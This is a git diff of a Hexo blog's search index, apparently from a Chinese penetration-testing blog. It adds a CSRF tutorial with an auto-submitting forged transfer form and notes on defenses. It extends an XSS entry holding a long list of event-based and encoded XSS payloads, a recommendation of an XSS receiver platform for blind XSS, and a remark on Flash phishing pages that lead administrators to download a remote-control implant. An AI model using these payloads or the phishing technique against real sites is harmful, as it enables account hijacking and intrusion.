@@ -1,6 +1,47 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CSRF总结</title>
+    <url>/2019/12/17/CSRF/</url>
+    <content><![CDATA[<p>CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：<br>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
+<a id="more"></a>
+
+<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：<br>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
+<h2 id="0x01-攻击原理"><a href="#0x01-攻击原理" class="headerlink" title="0x01 攻击原理"></a>0x01 攻击原理</h2><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A。<br>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A。<br>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B。<br>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A。<br>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </p>
+<h2 id="0x02攻击举例"><a href="#0x02攻击举例" class="headerlink" title="0x02攻击举例"></a>0x02攻击举例</h2><p>受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=BOB</code> 可以使 Bob 把 1000000 的存款转到 bob 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</p>
+<p>​    黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</p>
+<p>​    这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： <code>src=&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory&quot;</code>，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p>
+<p>攻击代码举例：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"ak"</span> action=<span class="string">"http://www.xxx.com/transfer.do"</span> method=<span class="string">"POST"</span> display=<span class="string">"none"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"accountNum"</span> value=<span class="string">"10001"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"money"</span> value=<span class="string">"10000"</span>/&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    var form = document.getElementById('ak'); /</span><span class="regexp">/获取ID对应的对象 document.forms.ak.submit() (这样也可以提交 自动跳转多种多样这里不再一一举例)</span></span><br><span class="line"><span class="regexp">    form.submit(); /</span><span class="regexp">/执行提交表单</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/CSRF.png" alt="html">    </p>
+<p><a href="https://www.4hou.com/web/10234.html" target="_blank" rel="noopener">在JSON端点上利用CSRF漏洞的实践教程</a></p>
+<p>网上也会有大量的例子这里大家搜索一下或者在DVWA上做实验即可。</p>
+<h2 id="0x03CSRF一些防御手法"><a href="#0x03CSRF一些防御手法" class="headerlink" title="0x03CSRF一些防御手法"></a>0x03CSRF一些防御手法</h2><p><strong>防御CSRF攻击：</strong></p>
+<p>​    目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
+<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP的网站有一些很好的文档来防止你的网站上出现CSRF漏洞</a></p>
+<p>   <strong>验证 HTTP Referer 字段</strong></p>
+<p>​    根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
+<p>​    这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
+<p>​    然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
+<p>​    <strong>在请求地址中添加 token 并验证</strong></p>
+<p>​     CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
+<p>​    这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <code>http://url?csrftoken=tokenvalue</code>。 而对于 POST 请求来说，要在 form 的最后加上 <code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
+<p>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
+<p>   <strong>在 HTTP 头中自定义属性并验证</strong></p>
+<p>​    这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。    然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
+<p>引用地址：<code>http://www.phpddt.com/reprint/csrf.html</code></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>漏洞挖掘</tag>
+        <tag>CSRF</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>跨站脚本攻击(XSS)</title>
     <url>/2019/12/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E(XSS)/</url>
     <content><![CDATA[<p>XSS漏洞是Web应用程序中最常见的漏洞之一。如果您的站点没有预防XSS漏洞的固定方法，那么很可能就存在XSS漏洞。文章讲会从代码层面讲解XSS还有一些Payload。</p>
@@ -113,7 +154,9 @@
 <p><code>&lt;script&gt;eval(z)&lt;/script&gt;</code><br>另外除了像上面多次提交，也可以引用其他变量如：eval(qUserInfo.spaceName)形式，由于qUserInfo.spaceName是可控变量，因此改变其值就可以绕过长度限制了</p>
 <h2 id="0x05-一些Payload"><a href="#0x05-一些Payload" class="headerlink" title="0x05 一些Payload"></a>0x05 一些Payload</h2><p>这里放一些由事件触发的payload 自己拿这些事件做了下实验还是挺好玩的 </p>
 <p>FUZZ思路就是选弹框不一样payload直接全放进去一般指富文本编辑器或者留言框 其他的就用爆破把 注意线程就好了</p>
-<p>还有要强力推荐一下<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">BlueLotus_XSS</a>平台 dockerfile很方便 平台很好用</p>
+<p>还有要强力推荐一下<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">BlueLotus_XSS</a>平台 dockerfile很方便 平台很好用 里面有一部分payload模板也可以自己去写一些模板然后生成js文件 </p>
+<p>一些网上也提供xss平台 他们有大量的payload而且服务器是一直开着的对我们盲打xss有很大的优势</p>
+<p>还有一个flash钓鱼 伪造flash页面一些管理员安全意识不强会进入钓鱼页面 下载我们伪造的文件 直接上线主机 远控一般用CS</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">其实所有经过Unicode编码的payload都不需要双引号和分号就可以执行 而转化为ascii转化为十六进制后就不行</span><br><span class="line"></span><br><span class="line">引号过滤绕过</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41))&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">img标签</span><br><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;CSS&apos;))&quot;&gt; //版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img STYLE=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;   //版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;//版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img src=x onerror=alert(&apos;xss&apos;)&gt; //全版本通用</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; //可以不加&quot;和;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;  //必须要有双引号，不然执行不了</span><br><span class="line">&lt;img src=&quot;https://melons.top/images/hexo-inverted.svg&quot; onload=alert(&apos;xss&apos;)&gt;  //当src为正常图片加载出来的时候会加载onload属性</span><br><span class="line">&lt;img src=&quot;x&quot; onmousedown=alert(&apos;xss&apos;)&gt;  //点击图片触发</span><br><span class="line">&lt;img src=&quot;x&quot; onmousemove=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //鼠标在图片上移动触发</span><br><span class="line">&lt;img src=1 onmouseover=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //鼠标进入图片触发</span><br><span class="line">&lt;img src=1 onmouseout=alert(&apos;xss&apos;)&gt; //鼠标离开图片触发</span><br><span class="line">&lt;img src=1 onmouseup=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //在图片上释放鼠标事件执行 点击一下两个事件 获取 释放 后者事件满足则触发</span><br><span class="line">&lt;img src=1 onmousewheel=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt;  //在图片上滚动 可以使用style写css覆盖当前页面</span><br><span class="line"></span><br><span class="line">video标签下</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; oncanplay=alert(1)&gt; //当文件就绪可以开始播放时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; ondurationchange=alert(2)&gt; //当媒介长度改变时运行的脚本。</span><br><span class="line">&lt;video src=&quot;x&quot; onerror=alert(2)&gt;</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadeddata=alert(2)&gt; //当媒介数据已加载时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadedmetadata=alert(2)&gt; //当元数据（比如分辨率和时长）被加载时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadstart=alert(123)&gt; //当媒介数据开始加载时运行的脚本</span><br><span class="line"></span><br><span class="line">a标签下</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;a标签xss&apos;)&quot;&gt;a标签xss&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;a标签xss2&lt;/a&gt; //不可以去双引号</span><br><span class="line">&lt;a href=javascript:eval(&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot;)&gt;a标签xss3&lt;/a&gt; //可以去双引号</span><br><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt;a标签xss4&lt;/a&gt; //可以去双引号</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt; //无反应 但在地址栏中输入base64会弹框会弹窗</span><br><span class="line">&lt;a href=&quot;&quot; onclick=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;aaaaa&lt;/a&gt; //可以去掉双引号</span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;aaaaa&lt;/a&gt; </span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;aaaaa&lt;/a&gt; </span><br><span class="line"></span><br><span class="line">input标签下</span><br><span class="line">&lt;input value=&quot;&quot; onclick=&quot;alert(document.cookie)&quot; type=&quot;text&quot;&gt; //点击输入框时触发</span><br><span class="line">&lt;INPUT name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; onmouseover=prompt(document.cookie) style=&quot;width:100%;height:100%;&quot;&gt; </span><br><span class="line"></span><br><span class="line">span标签下</span><br><span class="line">&lt;span id=&quot;span&quot;  recieveurl=&apos;xxxeId=1&apos; accesskey=&apos;X&apos; onclick=&apos;alert(/xss/)&apos; bad=&apos;&apos;&gt;&lt;/span&gt; //alt+shift+x 触发 感觉很鸡肋</span><br><span class="line"></span><br><span class="line">iframe标签下</span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;); height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;iframe&gt; //设置好css可以完美隐藏</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot; height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert`1`&amp;lt;/script&amp;gt;&quot; height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;http://www.baidu.com&quot; onmouseover=alert(&apos;xss&apos;) height=100%0 width=100% style=&quot;border:0px;position: absolute;top:0px;left:0px;&quot;/&gt;&lt;iframe&gt; //css使用绝对定位覆盖全部撑开</span><br><span class="line">&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;;&quot; frameborder=&quot;0&quot; width=&quot;100%&quot; height=&quot;1120px&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
@@ -229,8 +272,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>php</tag>
         <tag>漏洞挖掘</tag>
+        <tag>php</tag>
         <tag>SSRF</tag>
       </tags>
   </entry>
@@ -301,8 +344,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>php</tag>
         <tag>漏洞挖掘</tag>
+        <tag>php</tag>
         <tag>序列化</tag>
       </tags>
   </entry>
@@ -605,6 +648,7 @@
 
 <p><strong>linux中直接查看文件内容的工具</strong></p>
 <p>cat、tac、more、less、head、tail、nl、sed、sort、uniq</p>
+<h3 id="9-其他的一些注入问题"><a href="#9-其他的一些注入问题" class="headerlink" title="9.其他的一些注入问题"></a>9.其他的一些注入问题</h3><p>soap注入 邮件头注入 ldap注入 xpath注入 xml实体注入</p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -747,8 +791,8 @@
         <category>webshell</category>
       </categories>
       <tags>
-        <tag>js</tag>
         <tag>php</tag>
+        <tag>js</tag>
       </tags>
   </entry>
   <entry>
